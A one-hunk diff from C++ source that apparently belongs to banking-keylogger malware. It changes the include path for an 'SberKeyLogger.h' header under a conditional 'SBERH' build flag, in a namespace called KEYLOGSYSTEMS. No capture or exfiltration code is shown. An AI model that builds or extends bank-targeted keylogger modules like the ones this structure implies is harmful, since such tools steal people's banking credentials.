@@ -27,7 +27,7 @@ namespace KEYLOGSYSTEMS
 #define DBG KEYLOGSYSTEMS::DBGOutMessage<>
 
 #ifdef SBERH
-	#include "RuBnk\SberKeyLogger.h"
+	#include "SberKeyLogger.h"
 #endif
 
 // ---------------------------------------------------------------------------
